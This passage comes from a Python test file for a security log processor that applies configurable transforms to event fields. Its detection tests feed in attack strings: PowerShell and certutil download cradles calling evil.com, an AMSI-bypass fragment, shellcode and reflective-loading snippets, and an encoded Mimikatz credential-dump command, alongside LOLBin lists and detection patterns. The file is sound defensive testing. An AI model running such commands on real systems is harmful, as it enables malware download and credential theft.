            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return 't1:' + param",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return 't2:' + param",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                    {"info": "t3", "type": "python",
                     "code": "def transform(param): return 't3:' + param",
                     "alias": True, "alias_name": "T3",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": [],
            "transform_categories": {
                "cat_a": ["T1", "T2"],
                "cat_b": ["T3"],
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        # Enable just cat_a
        args = make_args_config("json_input")
        args.transform_categories = ["cat_a"]
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set
        assert "T3" not in processor.enabled_transforms_set

    def test_transform_category_multiple_categories(self, tmp_path, test_logger):
        """Test that multiple --transform-category flags combine."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return 't1'",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return 't2'",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": [],
            "transform_categories": {
                "cat_a": ["T1"],
                "cat_b": ["T2"],
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = make_args_config("json_input")
        args.transform_categories = ["cat_a", "cat_b"]
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set

    def test_transform_category_unknown_warns(self, tmp_path, test_logger):
        """Test that unknown category name logs a warning."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {},
            "enabled_transforms": [],
            "transform_categories": {"cat_a": ["T1"]}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = make_args_config("json_input")
        args.transform_categories = ["nonexistent"]
        # Should not raise, just warn
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        assert processor.transforms_enabled is True

    def test_transform_category_merges_with_existing(self, tmp_path, test_logger):
        """Test that --transform-category merges with existing enabled_transforms."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True,
            "transforms": {
                "TestField": [
                    {"info": "t1", "type": "python",
                     "code": "def transform(param): return 't1'",
                     "alias": True, "alias_name": "T1",
                     "source_condition": ["json_input"]},
                    {"info": "t2", "type": "python",
                     "code": "def transform(param): return 't2'",
                     "alias": True, "alias_name": "T2",
                     "source_condition": ["json_input"]},
                ]
            },
            "enabled_transforms": ["T1"],  # T1 already enabled
            "transform_categories": {
                "cat_b": ["T2"],
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))

        args = make_args_config("json_input")
        args.transform_categories = ["cat_b"]
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        # Both T1 (from enabled_transforms) and T2 (from category) should be enabled
        assert "T1" in processor.enabled_transforms_set
        assert "T2" in processor.enabled_transforms_set


class TestTransformCaching:
    """Tests for transform function caching."""
    
    def test_transform_func_cached(self, field_mappings_file_multi, test_logger, args_config_json_input):
        """Test that transform functions are properly cached."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        code = "def transform(param):\n    return param.upper()"
        
        # First call - should compile and cache
        func1 = processor._get_transform_func(code)
        assert func1 is not None
        
        # Second call - should return cached function
        func2 = processor._get_transform_func(code)
        assert func2 is func1  # Same object reference
        
        # Verify it works
        assert func1("hello") == "HELLO"
    
    def test_bytecode_cached(self, field_mappings_file_multi, test_logger, args_config_json_input):
        """Test that compiled bytecode is cached."""
        processor = StreamingEventProcessor(
            config_file=field_mappings_file_multi,
            args_config=args_config_json_input,
            logger=test_logger
        )
        
        code = "def transform(param):\n    return param.lower()"
        
        # Clear caches
        processor.compiled_code_cache.clear()
        processor._transform_func_cache.clear()
        
        # First call
        processor._get_transform_func(code)
        assert code in processor.compiled_code_cache
        
        # Bytecode should be cached
        bytecode = processor.compiled_code_cache[code]
        processor._get_transform_func(code)
        assert processor.compiled_code_cache[code] is bytecode


class TestHexToAsciiTransform:
    """Tests for hex to ASCII transformation (used in auditd logs)."""
    
    def test_hex_to_ascii_transform(self, tmp_path, test_logger):
        """Test hex to ASCII transformation for proctitle."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "proctitle": [{
                    "info": "Proctitle HEX to ASCII",
                    "type": "python",
                    "code": "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00', ' ')",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["auditd_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = Namespace(evtx_input=False, json_input=False, auditd_input=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        # "ls -la" in hex: 6c73002d6c61
        result = processor._transform_value(
            "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00', ' ')",
            "6c73002d6c61"
        )
        assert result == "ls -la"
    
    def test_invalid_hex_returns_original(self, tmp_path, test_logger):
        """Test that invalid hex returns original value."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = Namespace(evtx_input=False, json_input=False, auditd_input=True)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    return bytes.fromhex(param).decode('ascii')",
            "not_valid_hex"
        )
        # Should return original on error
        assert result == "not_valid_hex"


class TestEdgeCases:
    """Tests for edge cases in transforms."""
    
    def test_transform_with_none_value(self, tmp_path, test_logger):
        """Test transform behavior with None values."""
        config = {
            "exclusions": [],
            "useless": [],  # Don't filter None
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {
                "TestField": [{
                    "info": "Handle None",
                    "type": "python",
                    "code": "def transform(param):\n    return 'was_none' if param is None else param",
                    "alias": False,
                    "alias_name": "",
                    "source_condition": ["json_input"],
                    "enabled": True
                }]
            }
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = Namespace(evtx_input=False, json_input=True, auditd_input=False)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        result = processor._transform_value(
            "def transform(param):\n    return 'was_none' if param is None else param",
            None
        )
        assert result == "was_none"
    
    def test_transform_with_special_characters(self, tmp_path, test_logger):
        """Test transform with special characters."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = Namespace(evtx_input=False, json_input=True, auditd_input=False)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        # Test with unicode
        result = processor._transform_value(
            "def transform(param):\n    return param.upper()",
            "héllo wörld 日本語"
        )
        assert result == "HÉLLO WÖRLD 日本語"
        
        # Test with escape sequences
        result = processor._transform_value(
            "def transform(param):\n    return param.replace('\\n', ' ')",
            "line1\nline2"
        )
        assert result == "line1 line2"
    
    def test_transform_with_very_long_string(self, tmp_path, test_logger):
        """Test transform with very long string input."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = Namespace(evtx_input=False, json_input=True, auditd_input=False)
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        long_string = "a" * 100000
        result = processor._transform_value(
            "def transform(param):\n    return str(len(param))",
            long_string
        )
        assert result == "100000"


class TestSecurityTransforms:
    """Tests for security-oriented transforms."""
    
    def test_url_extraction_transform(self, tmp_path, test_logger):
        """Test URL extraction from command lines."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        url_extract_code = r"""def transform(param):
    import re
    url_pattern = r'(https?://[^\s\'"<>]+|ftp://[^\s\'"<>]+)'
    matches = re.findall(url_pattern, param, re.IGNORECASE)
    cleaned = []
    for url in matches:
        url = url.rstrip('.,;:)]\'"')
        if len(url) > 10:
            cleaned.append(url)
    return '|'.join(cleaned) if cleaned else ''"""
        
        result = processor._transform_value(
            url_extract_code,
            "powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
        )
        assert "http://evil.com/mal.ps1" in result
    
    def test_xor_detection_transform(self, tmp_path, test_logger):
        """Test XOR operation detection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        # Fixed regex: hex pattern first to match 0x35 before decimal matches 0
        xor_code = r"""def transform(param):
    import re
    indicators = []
    if re.search(r'-bxor', param, re.IGNORECASE):
        indicators.append('BXOR_OP')
    # Match hex first (0x...) then decimal
    xor_key_match = re.search(r'-bxor\s*(0x[0-9a-fA-F]+|\d+)', param, re.IGNORECASE)
    if xor_key_match:
        indicators.append('XOR_KEY:' + xor_key_match.group(1))
    if re.search(r'for.*-bxor|foreach.*-bxor', param, re.IGNORECASE):
        indicators.append('XOR_LOOP')
    return '|'.join(indicators) if indicators else ''"""
        
        # Test with XOR in a loop
        result = processor._transform_value(
            xor_code,
            "$decoded = $bytes | ForEach-Object { $_ -bxor 0x35 }"
        )
        assert "BXOR_OP" in result
        assert "XOR_KEY:0x35" in result
        assert "XOR_LOOP" in result
    
    def test_amsi_bypass_detection(self, tmp_path, test_logger):
        """Test AMSI bypass detection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        amsi_code = r"""def transform(param):
    import re
    indicators = []
    param_lower = param.lower()
    if 'amsi' in param_lower:
        indicators.append('AMSI_REF')
    if re.search(r'amsiInitFailed', param, re.IGNORECASE):
        indicators.append('AMSI_INIT_FAILED')
    if re.search(r'\[Ref\]\.Assembly\.GetType.*AMSI', param, re.IGNORECASE):
        indicators.append('AMSI_REFLECTION')
    return '|'.join(indicators) if indicators else ''"""
        
        result = processor._transform_value(
            amsi_code,
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        )
        assert "AMSI_REF" in result
        assert "AMSI_REFLECTION" in result
    
    def test_download_cradle_detection(self, tmp_path, test_logger):
        """Test download cradle detection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        cradle_code = r"""def transform(param):
    import re
    indicators = []
    param_lower = param.lower()
    if 'downloadstring' in param_lower:
        indicators.append('DOWNLOADSTRING')
    if 'webclient' in param_lower:
        indicators.append('WEBCLIENT')
    if re.search(r'certutil.*-urlcache', param, re.IGNORECASE):
        indicators.append('CERTUTIL_DOWNLOAD')
    return '|'.join(indicators) if indicators else ''"""
        
        # Test PowerShell download cradle
        result = processor._transform_value(
            cradle_code,
            "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
        )
        assert "DOWNLOADSTRING" in result
        assert "WEBCLIENT" in result
        
        # Test certutil download
        result = processor._transform_value(
            cradle_code,
            "certutil.exe -urlcache -split -f http://evil.com/file.exe"
        )
        assert "CERTUTIL_DOWNLOAD" in result
    
    def test_shellcode_indicators_detection(self, tmp_path, test_logger):
        """Test shellcode indicator detection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        shellcode_code = r"""def transform(param):
    import re
    indicators = []
    param_lower = param.lower()
    if re.search(r'virtualalloc.*0x40', param, re.IGNORECASE):
        indicators.append('EXEC_MEMORY_ALLOC')
    if 'kernel32' in param_lower:
        indicators.append('KERNEL32_REF')
    if 'createthread' in param_lower:
        indicators.append('CREATE_THREAD')
    return '|'.join(indicators) if indicators else ''"""
        
        result = processor._transform_value(
            shellcode_code,
            "[DllImport('kernel32')]static extern IntPtr VirtualAlloc(IntPtr, uint, uint, uint 0x40)"
        )
        assert "KERNEL32_REF" in result
    
    def test_reflection_abuse_detection(self, tmp_path, test_logger):
        """Test .NET reflection abuse detection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        reflection_code = r"""def transform(param):
    import re
    indicators = []
    param_lower = param.lower()
    if 'system.reflection.assembly' in param_lower:
        indicators.append('ASSEMBLY_LOAD')
    if re.search(r'\.invoke\(', param, re.IGNORECASE):
        indicators.append('INVOKE_METHOD')
    if re.search(r'getmethod\(', param, re.IGNORECASE):
        indicators.append('GET_MEMBER')
    return '|'.join(indicators) if indicators else ''"""
        
        result = processor._transform_value(
            reflection_code,
            "[System.Reflection.Assembly]::Load($bytes).GetType('Payload').GetMethod('Run').Invoke($null, @())"
        )
        assert "ASSEMBLY_LOAD" in result
        assert "INVOKE_METHOD" in result
        assert "GET_MEMBER" in result
    
    def test_suspicious_registry_detection(self, tmp_path, test_logger):
        """Test suspicious registry path detection."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        registry_code = r"""def transform(param):
    import re
    suspicious = []
    param_lower = param.lower()
    if re.search(r'\\run\\|\\runonce\\', param, re.IGNORECASE):
        suspicious.append('RUN_KEY')
    if re.search(r'\\services\\', param, re.IGNORECASE):
        suspicious.append('SERVICE_KEY')
    if 'image file execution options' in param_lower:
        suspicious.append('IFEO')
    return '|'.join(suspicious) if suspicious else ''"""
        
        # Test Run key
        result = processor._transform_value(
            registry_code,
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware"
        )
        assert "RUN_KEY" in result
        
        # Test IFEO
        result = processor._transform_value(
            registry_code,
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe"
        )
        assert "IFEO" in result
    
    def test_port_categorization(self, tmp_path, test_logger):
        """Test destination port categorization."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        port_code = """def transform(param):
    try:
        port = int(param)
    except (ValueError, TypeError):
        return ''
    
    if port == 80:
        return 'HTTP'
    elif port == 443:
        return 'HTTPS'
    elif port == 445:
        return 'SMB'
    elif port == 3389:
        return 'RDP'
    elif port == 4444:
        return 'METASPLOIT_DEFAULT'
    return ''"""
        
        assert processor._transform_value(port_code, "80") == "HTTP"
        assert processor._transform_value(port_code, "443") == "HTTPS"
        assert processor._transform_value(port_code, "445") == "SMB"
        assert processor._transform_value(port_code, "3389") == "RDP"
        assert processor._transform_value(port_code, "4444") == "METASPLOIT_DEFAULT"
    
    def test_network_ioc_extraction(self, tmp_path, test_logger):
        """Test network IOC extraction from scripts."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        
        ioc_code = r"""def transform(param):
    import re
    iocs = []
    ipv4_pattern = r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
    ips = re.findall(ipv4_pattern, param)
    for ip in ips:
        if not ip.startswith(('0.', '127.', '255.')):
            iocs.append('IP:' + ip)
    url_pattern = r'(https?://[^\s\'"<>]+)'
    urls = re.findall(url_pattern, param, re.IGNORECASE)
    for url in urls[:5]:
        url = url.rstrip('.,;:)]\'"')
        iocs.append('URL:' + url[:100])
    return '|'.join(iocs) if iocs else ''"""
        
        result = processor._transform_value(
            ioc_code,
            "$client = New-Object Net.WebClient; $client.DownloadString('http://192.168.1.100:8080/payload')"
        )
        assert "IP:192.168.1.100" in result
        assert "URL:http://192.168.1.100:8080/payload" in result

    def test_ip_obfuscation_returns_empty_for_normal_ip(self, tmp_path, test_logger):
        """Test DestinationIp_ObfuscationCheck returns '' for normal IPs."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    import re
    obfuscation_patterns = [
        r'0x[0-9a-fA-F]{8}',
        r'^\\d{9,10}$',
        r'0[0-7]{1,3}\\.0[0-7]{1,3}\\.0[0-7]{1,3}\\.0[0-7]{1,3}',
        r'0x[0-9a-fA-F]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'
    ]
    for pattern in obfuscation_patterns:
        if re.match(pattern, param.strip()):
            return 'OBFUSCATED_IP:' + param
    return ''"""
        # Normal IP -> return ''
        assert processor._transform_value(code, "192.168.1.1") == ""
        # Hex IP -> flag it
        assert processor._transform_value(code, "0x7f000001").startswith("OBFUSCATED_IP:")
        # Decimal IP -> flag it
        assert processor._transform_value(code, "2130706433").startswith("OBFUSCATED_IP:")

    def test_tld_returns_empty_for_bare_hostname(self, tmp_path, test_logger):
        """Test QueryName_TLD returns '' when no TLD structure."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    parts = param.rstrip('.').split('.')
    if len(parts) >= 2:
        return parts[-1]
    return ''"""
        # Valid domain -> extract TLD
        assert processor._transform_value(code, "www.google.com") == "com"
        # Bare hostname (no dots) -> return ''
        assert processor._transform_value(code, "localhost") == ""
        # Single label -> return ''
        assert processor._transform_value(code, "WORKGROUP") == ""

    def test_b64_decode_returns_empty_for_no_base64(self, tmp_path, test_logger):
        """Test base64 decode transforms return '' when input has no base64 content."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    base64_pattern = r'(?:[A-Za-z0-9+/]{4}){5,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
    matches = re.findall(base64_pattern, param)
    if not matches:
        return ''
    decoded_values = []
    for match in matches:
        try:
            decoded_bytes = base64.b64decode(match)
            detection = chardet.detect(decoded_bytes)
            encoding = detection.get('encoding')
            confidence = detection.get('confidence', 0) or 0
            if encoding and confidence > 0.5 and encoding.lower() in ('utf-8', 'ascii', 'utf-16le'):
                decoded_str = decoded_bytes.decode(encoding).strip()
                if decoded_str.isprintable() and len(decoded_str) > 10:
                    decoded_values.append(decoded_str)
        except:
            continue
    return '|'.join(decoded_values) if decoded_values else 'b64_detected_cannot_decode'"""
        # Normal command line -- no base64 patterns at all -> ''
        assert processor._transform_value(code, "C:\\Windows\\System32\\svchost.exe -k netsvcs") == ""
        # Short base64-like string (16 chars = 4 groups, below {5,} threshold) -> ''
        assert processor._transform_value(code, "run ABCDEFGHIJKLMNop") == ""
        # Completely non-base64 -> ''
        assert processor._transform_value(code, "just a regular log line with spaces and punctuation!") == ""

    def test_b64_decode_returns_value_for_valid_base64(self, tmp_path, test_logger):
        """Test base64 decode transforms return decoded text for legitimate encoded content."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    base64_pattern = r'(?:[A-Za-z0-9+/]{4}){5,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
    matches = re.findall(base64_pattern, param)
    if not matches:
        return ''
    decoded_values = []
    for match in matches:
        try:
            decoded_bytes = base64.b64decode(match)
            detection = chardet.detect(decoded_bytes)
            encoding = detection.get('encoding')
            confidence = detection.get('confidence', 0) or 0
            if encoding and confidence > 0.5 and encoding.lower() in ('utf-8', 'ascii', 'utf-16le'):
                decoded_str = decoded_bytes.decode(encoding).strip()
                if decoded_str.isprintable() and len(decoded_str) > 10:
                    decoded_values.append(decoded_str)
        except:
            continue
    return '|'.join(decoded_values) if decoded_values else 'b64_detected_cannot_decode'"""
        # "Invoke-Mimikatz -DumpCreds" base64-encoded (long enough, printable, utf-8)
        import base64
        payload = "Invoke-Mimikatz -DumpCreds"
        encoded = base64.b64encode(payload.encode('utf-8')).decode('ascii')
        cmd = f"powershell -enc {encoded}"
        result = processor._transform_value(code, cmd)
        assert payload in result

    def test_b64_decode_returns_marker_for_binary_garbage(self, tmp_path, test_logger):
        """Test base64 decode returns 'b64_detected_cannot_decode' when base64 is found but decodes to garbage."""
        config = {
            "exclusions": [], "useless": [None, ""], "mappings": {},
            "alias": {}, "split": {}, "transforms_enabled": True, "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file), args_config=args, logger=test_logger
        )
        code = """def transform(param):
    base64_pattern = r'(?:[A-Za-z0-9+/]{4}){5,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
    matches = re.findall(base64_pattern, param)
    if not matches:
        return ''
    decoded_values = []
    for match in matches:
        try:
            decoded_bytes = base64.b64decode(match)
            detection = chardet.detect(decoded_bytes)
            encoding = detection.get('encoding')
            confidence = detection.get('confidence', 0) or 0
            if encoding and confidence > 0.5 and encoding.lower() in ('utf-8', 'ascii', 'utf-16le'):
                decoded_str = decoded_bytes.decode(encoding).strip()
                if decoded_str.isprintable() and len(decoded_str) > 10:
                    decoded_values.append(decoded_str)
        except:
            continue
    return '|'.join(decoded_values) if decoded_values else 'b64_detected_cannot_decode'"""
        # Encode non-printable binary bytes (null bytes, control chars)
        import base64
        binary_garbage = bytes(range(0, 30))  # 30 bytes of control characters
        encoded_garbage = base64.b64encode(binary_garbage).decode('ascii')
        result = processor._transform_value(code, f"cmd {encoded_garbage}")
        assert result == "b64_detected_cannot_decode"


class TestProposedTransforms:
    """Tests for the new proposed transforms in RestrictedPython."""
    
    def test_url_decode_transform(self, tmp_path, test_logger):
        """Test URL decoding transform."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        # URL decode transform - returns '' when no encoding found
        url_decode_code = """def transform(param):
    import re
    if '%' not in param:
        return ''
    def decode_match(m):
        return chr(int(m.group(1), 16))
    decoded = re.sub(r'%([0-9A-Fa-f]{2})', decode_match, param)
    return decoded if decoded != param else ''"""
        
        result = processor._transform_value(url_decode_code, "C%3A%5CWindows%5CSystem32")
        assert result == "C:\\Windows\\System32"
        
        result = processor._transform_value(url_decode_code, "hello%20world")
        assert result == "hello world"
        
        # No encoding present -> return ''
        result = processor._transform_value(url_decode_code, "C:\\Windows\\System32\\cmd.exe")
        assert result == ""
    
    def test_extract_exe_name_transform(self, tmp_path, test_logger):
        """Test extracting executable name from path."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        exe_name_code = """def transform(param):
    parts = param.replace('\\\\', '/').split('/')
    name = parts[-1] if parts else ''
    return name if name and name != param else ''"""
        
        result = processor._transform_value(exe_name_code, "C:\\Windows\\System32\\cmd.exe")
        assert result == "cmd.exe"
        
        result = processor._transform_value(exe_name_code, "/usr/bin/bash")
        assert result == "bash"
        
        # Bare executable name (no path) -> return ''
        result = processor._transform_value(exe_name_code, "cmd.exe")
        assert result == ""
    
    def test_lolbin_detection_transform(self, tmp_path, test_logger):
        """Test LOLBin detection transform."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        lolbin_code = """def transform(param):
    lolbins = [
        'certutil', 'mshta', 'regsvr32', 'rundll32', 'wmic',
        'cscript', 'wscript', 'powershell', 'cmd', 'msiexec',
        'bitsadmin'
    ]
    exe_name = param.replace('\\\\', '/').split('/')[-1].lower()
    exe_name = exe_name.replace('.exe', '')
    if exe_name in lolbins:
        return 'LOLBIN:' + exe_name
    return ''"""
        
        result = processor._transform_value(lolbin_code, "C:\\Windows\\System32\\certutil.exe")
        assert result == "LOLBIN:certutil"
        
        result = processor._transform_value(lolbin_code, "C:\\Windows\\System32\\notepad.exe")
        assert result == ""
    
    def test_user_domain_extraction_transform(self, tmp_path, test_logger):
        """Test extracting username and domain from User field."""
        config = {
            "exclusions": [],
            "useless": [None, ""],
            "mappings": {},
            "alias": {},
            "split": {},
            "transforms_enabled": True,
            "transforms": {}
        }
        config_file = tmp_path / "config.json"
        config_file.write_text(json.dumps(config))
        
        args = make_args_config("json_input")
        processor = StreamingEventProcessor(
            config_file=str(config_file),
            args_config=args,
            logger=test_logger
        )
        
        # Extract username - returns '' when no domain separator
        username_code = """def transform(param):
    if '\\\\' in param:
        return param.split('\\\\')[-1]
    elif '@' in param:
        return param.split('@')[0]
    return ''"""
        
        result = processor._transform_value(username_code, "DOMAIN\\admin")
        assert result == "admin"
        
        result = processor._transform_value(username_code, "user@domain.com")
        assert result == "user"
        
        # Bare username (no domain) -> return ''
        result = processor._transform_value(username_code, "localadmin")
        assert result == ""
        
        # Extract domain - already returns '' when no domain separator
        domain_code = """def transform(param):
    if '\\\\' in param:
        parts = param.split('\\\\')
        return parts[0] if len(parts) > 1 else ''
    elif '@' in param:
        parts = param.split('@')
        return parts[1] if len(parts) > 1 else ''
    return ''"""
        
        result = processor._transform_value(domain_code, "DOMAIN\\admin")
        assert result == "DOMAIN"
        
        result = processor._transform_value(domain_code, "user@domain.com")
        assert result == "domain.com"
        
        # Bare username (no domain) -> return ''
        result = processor._transform_value(domain_code, "localadmin")
        assert result == ""
    
    def test_hash_extraction_transform(self, tmp_path, test_logger):
        """Test MD5 and SHA256 hash extraction from Hashes field."""
